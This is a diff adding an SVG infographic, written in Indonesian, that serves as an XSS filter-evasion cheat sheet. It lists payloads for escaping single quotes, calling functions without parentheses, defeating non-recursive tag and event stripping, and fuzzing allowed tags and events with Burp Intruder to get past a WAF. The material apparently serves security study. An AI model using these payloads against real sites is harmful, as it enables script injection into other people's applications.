@@ -1,0 +1,189 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 560" width="100%" height="100%">
+  <defs>
+    <!-- Background Gradient -->
+    <linearGradient id="bgGrad5" x1="0%" y1="0%" x2="100%" y2="100%">
+      <stop offset="0%" stop-color="#090D16"/>
+      <stop offset="50%" stop-color="#0F172A"/>
+      <stop offset="100%" stop-color="#090D16"/>
+    </linearGradient>
+
+    <!-- Card Backgrounds -->
+    <linearGradient id="cardGrad5" x1="0%" y1="0%" x2="0%" y2="100%">
+      <stop offset="0%" stop-color="#1E293B" stop-opacity="0.95"/>
+      <stop offset="100%" stop-color="#0F172A" stop-opacity="0.95"/>
+    </linearGradient>
+
+    <!-- Shadow -->
+    <filter id="cardShadow5" x="-10%" y="-10%" width="120%" height="125%">
+      <feDropShadow dx="0" dy="8" stdDeviation="12" flood-color="#000000" flood-opacity="0.5"/>
+    </filter>
+
+    <!-- Glows -->
+    <filter id="glowPurple5" x="-20%" y="-20%" width="140%" height="140%">
+      <feGaussianBlur stdDeviation="6" result="blur" />
+      <feComposite in="SourceGraphic" in2="blur" operator="over" />
+    </filter>
+  </defs>
+
+  <style>
+    .title { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-weight: 800; fill: #F8FAFC; }
+    .subtitle { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-weight: 500; fill: #94A3B8; }
+    .card-title { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-weight: 700; }
+    .code-text { font-family: 'JetBrains Mono', monospace; font-size: 10px; font-weight: 600; }
+    .desc-text { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-size: 11.5px; fill: #CBD5E1; }
+    .badge { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; font-size: 10px; font-weight: 700; }
+  </style>
+
+  <!-- Base Canvas -->
+  <rect width="1080" height="560" rx="16" fill="url(#bgGrad5)"/>
+  <rect width="1080" height="560" rx="16" fill="none" stroke="#334155" stroke-width="1.5" stroke-opacity="0.6"/>
+
+  <!-- Header -->
+  <g transform="translate(48, 40)">
+    <rect x="0" y="0" width="165" height="24" rx="12" fill="#8B5CF6" fill-opacity="0.15" stroke="#8B5CF6" stroke-width="1"/>
+    <text x="82" y="16" text-anchor="middle" class="badge" fill="#C4B5FD">FILTER EVASION MATRIX</text>
+    <text x="180" y="18" class="title" font-size="20">XSS: Bypass Single Quote, Advanced Filters, &amp; Intruder Fuzzing</text>
+    <text x="0" y="42" class="subtitle" font-size="13">Teknik Menembus Sanitasi Server-Side, Blacklist Tags, Filter Tanda Kurung/Kutip, dan Otomasi Burp Suite</text>
+  </g>
+
+  <!-- ==================== CARD 1: SINGLE QUOTE BYPASS ==================== -->
+  <g transform="translate(48, 115)" filter="url(#cardShadow5)">
+    <rect width="230" height="405" rx="12" fill="url(#cardGrad5)" stroke="#38BDF8" stroke-width="1.5"/>
+    <text x="18" y="32" class="card-title" font-size="14" fill="#38BDF8">1. Single Quote (') Bypass</text>
+    <text x="18" y="48" class="desc-text" font-size="10.5" fill="#94A3B8">Escape Neutralization</text>
+    <line x1="18" y1="60" x2="212" y2="60" stroke="#334155" stroke-width="1"/>
+
+    <!-- Technique 1 -->
+    <rect x="14" y="70" width="202" height="75" rx="6" fill="#090D16" stroke="#1E293B" stroke-width="1"/>
+    <text x="22" y="88" class="badge" fill="#7DD3FC">BACKSLASH ESCAPE (\'):</text>
+    <text x="22" y="106" class="code-text" fill="#FDA4AF">\';alert(1)//</text>
+    <text x="22" y="122" class="desc-text" font-size="10.5">Input "\" mematikan backslash</text>
+    <text x="22" y="136" class="desc-text" font-size="10.5">escape dari server backend!</text>
+
+    <!-- Technique 2 -->
+    <rect x="14" y="155" width="202" height="75" rx="6" fill="#090D16" stroke="#1E293B" stroke-width="1"/>
+    <text x="22" y="173" class="badge" fill="#7DD3FC">BACKTICKS ES6 (``):</text>
+    <text x="22" y="191" class="code-text" fill="#FDE047">alert`XSS`</text>
+    <text x="22" y="207" class="desc-text" font-size="10.5">Menggantikan tanda kutip</text>
+    <text x="22" y="221" class="desc-text" font-size="10.5">menggunakan template literal.</text>
+
+    <!-- Technique 3 -->
+    <rect x="14" y="240" width="202" height="75" rx="6" fill="#090D16" stroke="#1E293B" stroke-width="1"/>
+    <text x="22" y="258" class="badge" fill="#7DD3FC">FROMCHARCODE / HTML ENTITY:</text>
+    <text x="22" y="276" class="code-text" font-size="8.5" fill="#34D399">String.fromCharCode(88)</text>
+    <text x="22" y="292" class="code-text" font-size="8.5" fill="#34D399">&amp;apos; / &amp;#39; (di atribut HTML)</text>
+    <text x="22" y="306" class="desc-text" font-size="10">Auto-decoded sebelum eksekusi.</text>
+
+    <!-- Status -->
+    <rect x="14" y="325" width="202" height="65" rx="6" fill="#0284C7" fill-opacity="0.1" stroke="#0284C7" stroke-width="1"/>
+    <text x="22" y="345" class="badge" fill="#7DD3FC">⚡ RESULT:</text>
+    <text x="22" y="363" class="desc-text" font-size="10.5">String literal JS berhasil</text>
+    <text x="22" y="379" class="desc-text" font-size="10.5">diputus tanpa syntax error!</text>
+  </g>
+
+  <!-- ==================== CARD 2: ADVANCED FILTER (NO PARENS) ==================== -->
+  <g transform="translate(294, 115)" filter="url(#cardShadow5)">
+    <rect width="230" height="405" rx="12" fill="url(#cardGrad5)" stroke="#10B981" stroke-width="1.5"/>
+    <text x="18" y="32" class="card-title" font-size="14" fill="#6EE7B7">2. Tanpa Kurung () / Kata</text>
+    <text x="18" y="48" class="desc-text" font-size="10.5" fill="#94A3B8">Advanced Filter Evasion</text>
+    <line x1="18" y1="60" x2="212" y2="60" stroke="#334155" stroke-width="1"/>
+
+    <!-- Technique 1 -->
+    <rect x="14" y="70" width="202" height="75" rx="6" fill="#090D16" stroke="#1E293B" stroke-width="1"/>
+    <text x="22" y="88" class="badge" fill="#6EE7B7">TAGGED TEMPLATE:</text>
+    <text x="22" y="106" class="code-text" fill="#FDE047">alert`1`</text>
+    <text x="22" y="122" class="desc-text" font-size="10.5">Mengeksekusi fungsi tanpa</text>
+    <text x="22" y="136" class="desc-text" font-size="10.5">tanda kurung buka/tutup ()!</text>
+
+    <!-- Technique 2 -->
+    <rect x="14" y="155" width="202" height="75" rx="6" fill="#090D16" stroke="#1E293B" stroke-width="1"/>
+    <text x="22" y="173" class="badge" fill="#6EE7B7">THROW ONERROR TRICK:</text>
+    <text x="22" y="191" class="code-text" font-size="8.5" fill="#A7F3D0">&lt;svg onload="throw</text>
+    <text x="22" y="207" class="code-text" font-size="8.5" fill="#FDA4AF"> onerror=alert,1"&gt;</text>
+    <text x="22" y="221" class="desc-text" font-size="10">Error handler oper parameter!</text>
+
+    <!-- Technique 3 -->
+    <rect x="14" y="240" width="202" height="75" rx="6" fill="#090D16" stroke="#1E293B" stroke-width="1"/>
+    <text x="22" y="258" class="badge" fill="#6EE7B7">KEYWORD BYPASS (OBJECT LOOKUP):</text>
+    <text x="22" y="276" class="code-text" font-size="8.5" fill="#FDE047">window['al'+'ert'](1)</text>
+    <text x="22" y="292" class="code-text" font-size="8.5" fill="#FDE047">top[/al/.source+/ert/.source](1)</text>
+    <text x="22" y="306" class="desc-text" font-size="10">Bypass regex blacklist kata.</text>
+
+    <!-- Status -->
+    <rect x="14" y="325" width="202" height="65" rx="6" fill="#047857" fill-opacity="0.1" stroke="#10B981" stroke-width="1"/>
+    <text x="22" y="345" class="badge" fill="#A7F3D0">⚡ RESULT:</text>
+    <text x="22" y="363" class="desc-text" font-size="10.5">WAF memblokir kata "alert"</text>
+    <text x="22" y="379" class="desc-text" font-size="10.5">dan "()" berhasil dilewati!</text>
+  </g>
+
+  <!-- ==================== CARD 3: SERVER-SIDE STRIPPING ==================== -->
+  <g transform="translate(540, 115)" filter="url(#cardShadow5)">
+    <rect width="240" height="405" rx="12" fill="url(#cardGrad5)" stroke="#F59E0B" stroke-width="1.5"/>
+    <text x="18" y="32" class="card-title" font-size="14" fill="#FBBF24">3. Server-Side Stripping</text>
+    <text x="18" y="48" class="desc-text" font-size="10.5" fill="#94A3B8">Non-Recursive Blacklist</text>
+    <line x1="18" y1="60" x2="222" y2="60" stroke="#334155" stroke-width="1"/>
+
+    <!-- Technique 1 -->
+    <rect x="14" y="70" width="212" height="75" rx="6" fill="#090D16" stroke="#1E293B" stroke-width="1"/>
+    <text x="22" y="88" class="badge" fill="#FDE047">NESTED TAG STRIPPING:</text>
+    <text x="22" y="106" class="code-text" font-size="9" fill="#FDA4AF">&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/script&gt;</text>
+    <text x="22" y="122" class="desc-text" font-size="10.5">Filter menghapus tag tengah,</text>
+    <text x="22" y="136" class="desc-text" font-size="10.5">sisa huruf menyatu jadi tag!</text>
+
+    <!-- Technique 2 -->
+    <rect x="14" y="155" width="212" height="75" rx="6" fill="#090D16" stroke="#1E293B" stroke-width="1"/>
+    <text x="22" y="173" class="badge" fill="#FDE047">NESTED EVENT STRIPPING:</text>
+    <text x="22" y="191" class="code-text" font-size="9" fill="#FDE047">&lt;img ononerrorer=alert(1)&gt;</text>
+    <text x="22" y="207" class="desc-text" font-size="10.5">Jika "onerror" dihapus 1x,</text>
+    <text x="22" y="221" class="desc-text" font-size="10.5">sisa huruf jadi "onerror".</text>
+
+    <!-- Technique 3 -->
+    <rect x="14" y="240" width="212" height="75" rx="6" fill="#090D16" stroke="#1E293B" stroke-width="1"/>
+    <text x="22" y="258" class="badge" fill="#FDE047">WHITESPACE BYPASS:</text>
+    <text x="22" y="276" class="code-text" font-size="8.5" fill="#38BDF8">&lt;img/src=x/onerror=alert(1)&gt;</text>
+    <text x="22" y="292" class="code-text" font-size="8.5" fill="#38BDF8">&lt;svg%09onload=alert(1)&gt;</text>
+    <text x="22" y="306" class="desc-text" font-size="10">Menggunakan slash atau tab.</text>
+
+    <!-- Status -->
+    <rect x="14" y="325" width="212" height="65" rx="6" fill="#D97706" fill-opacity="0.1" stroke="#F59E0B" stroke-width="1"/>
+    <text x="22" y="345" class="badge" fill="#FDE68A">⚡ RESULT:</text>
+    <text x="22" y="363" class="desc-text" font-size="10.5">Sanitasi string primitif</text>
+    <text x="22" y="379" class="desc-text" font-size="10.5">berhasil direkonstruksi!</text>
+  </g>
+
+  <!-- ==================== CARD 4: BURP INTRUDER FUZZING ==================== -->
+  <g transform="translate(796, 115)" filter="url(#cardShadow5)">
+    <rect width="236" height="405" rx="12" fill="url(#cardGrad5)" stroke="#A855F7" stroke-width="1.5"/>
+    <text x="18" y="32" class="card-title" font-size="14" fill="#D8B4FE">4. Burp Intruder Fuzzing</text>
+    <text x="18" y="48" class="desc-text" font-size="10.5" fill="#94A3B8">Extreme Filter Discovery</text>
+    <line x1="18" y1="60" x2="218" y2="60" stroke="#334155" stroke-width="1"/>
+
+    <!-- Stage 1 -->
+    <rect x="14" y="70" width="208" height="75" rx="6" fill="#090D16" stroke="#1E293B" stroke-width="1"/>
+    <text x="22" y="88" class="badge" fill="#C4B5FD">FUZZING TAG YANG DIIZINKAN:</text>
+    <text x="22" y="106" class="code-text" font-size="9" fill="#E9D5FF">&lt;§TAG§&gt; (Sniper Mode)</text>
+    <text x="22" y="122" class="desc-text" font-size="10.5">Cari tag yang hasil respons</text>
+    <text x="22" y="136" class="desc-text" font-size="10.5">200 OK (misal: animatetransform).</text>
+
+    <!-- Stage 2 -->
+    <rect x="14" y="155" width="208" height="75" rx="6" fill="#090D16" stroke="#1E293B" stroke-width="1"/>
+    <text x="22" y="173" class="badge" fill="#C4B5FD">FUZZING EVENT HANDLER:</text>
+    <text x="22" y="191" class="code-text" font-size="8.5" fill="#E9D5FF">&lt;svg §EVENT§=1&gt;</text>
+    <text x="22" y="207" class="desc-text" font-size="10.5">Fuzzing 100+ event: onbegin,</text>
+    <text x="22" y="221" class="desc-text" font-size="10.5">onfocus, onanimationend, dll.</text>
+
+    <!-- Stage 3 -->
+    <rect x="14" y="240" width="208" height="75" rx="6" fill="#090D16" stroke="#1E293B" stroke-width="1"/>
+    <text x="22" y="258" class="badge" fill="#C4B5FD">PENGATURAN PENTING:</text>
+    <text x="22" y="276" class="desc-text" font-size="10.5">• Uncheck: <tspan fill="#FDA4AF">URL-encode chars</tspan></text>
+    <text x="22" y="292" class="desc-text" font-size="10.5">• Grep - Match: <tspan fill="#34D399">200 OK vs 400</tspan></text>
+    <text x="22" y="306" class="desc-text" font-size="10">• Match unblocked tags list.</text>
+
+    <!-- Status -->
+    <rect x="14" y="325" width="208" height="65" rx="6" fill="#581C87" fill-opacity="0.3" stroke="#A855F7" stroke-width="1"/>
+    <text x="22" y="345" class="badge" fill="#E9D5FF">⚡ INTRUDER WIN:</text>
+    <text x="22" y="363" class="desc-text" font-size="10.5">Menemukan kombinasi tag &amp;</text>
+    <text x="22" y="379" class="desc-text" font-size="10.5">event yang lolos filter WAF!</text>
+  </g>
+
+</svg>
